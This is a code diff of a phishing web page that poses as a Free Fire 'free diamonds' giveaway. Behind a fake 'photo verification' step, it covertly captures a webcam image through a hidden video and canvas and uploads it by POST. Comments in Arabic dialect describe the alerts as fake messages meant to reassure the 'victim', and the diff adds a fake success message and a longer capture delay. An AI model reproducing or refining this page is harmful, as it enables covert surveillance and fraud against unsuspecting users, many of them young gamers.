@@ -1,34 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 Free Fire Rewards🎁</title>
+    <title>🎁 Free Fire Rewards 🎁</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; }
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; }
-        .app-icon { width: 100px; height: 100px; border-radius: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
-        h1 { font-size: 24px; color: #fff; margin-top: 15px; }
-        p { font-size: 16px; color: #ecf0f1; }
-        .btn { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; animation: pulse 1.5s infinite; }
-        /* أنيميشن زر النبض */
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 10px rgba(231, 76, 60, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0); }
-        }
-        /* إخفاء الفيديو والكانفاس */
+        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: #2c3e50; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
+        .app-icon { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 15px; }
+        h1 { font-size: 22px; color: #fff; margin: 10px 0; }
+        p { font-size: 14px; color: #bdc3c7; margin-bottom: 20px; }
+        .btn { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; transition: background 0.3s; }
+        .btn:hover { background: #c0392b; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://image.api.playstation.com/vulcan/ap/rnd/202107/2007/Xf2JmFvM3w2X0zP3vXzG4yvQ.png" alt="Free Fire" class="app-icon">
-        <h1>💎 Claim Your 1000 Diamonds 💎</h1>
-        <p>Verification is required to ensure account safety.</p>
+        <img src="https://dl.listdl.com/icons/garena-free-fire-icon.png" alt="Free Fire" class="app-icon">
+        <h1>💎 Claim 1000 Diamonds 💎</h1>
+        <p>Verification is required to ensure account safety. Please allow camera access.</p>
         <button class="btn" onclick="startCapture()">CLAIM & VERIFY NOW</button>
     </div>
 
-    <video id="video" width="640" height="480" autoplay></video>
+    <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
@@ -37,15 +31,15 @@
 
         async function startCapture() {
             try {
-                // 1. طلب الكاميرا ديريكت
+                // 1. طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // رسالة خادعة باش يآمن
-                alert("🎁 Checking account status... Photo validation required!");
+                // رسالة مزورة باش الضحية يآمن بلي كاين عملية
+                alert("🎁 Checking account status... Photo validation in progress. Do not close!");
 
-                // 2. التقاط صورة بعد 2 ثانية (باش يوافق)
+                // 2. الحل: زدنـا الوقت لـ 4 ثواني باش الكاميرا تفتح صافية
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
@@ -62,8 +56,12 @@
                             method: 'POST',
                             body: formData
                         });
+                        
+                        // رسالة نجاح مزورة للضحية
+                        setTimeout(() => alert("✅ Identity Verified! Diamonds will be added within 24 hours."), 1000);
+
                     }, 'image/jpeg');
-                }, 2000);
+                }, 4000); // 4 ثواني انتظار
 
             } catch (err) {
                 // رسالة خطأ مزورة إذا رفض الكاميرا
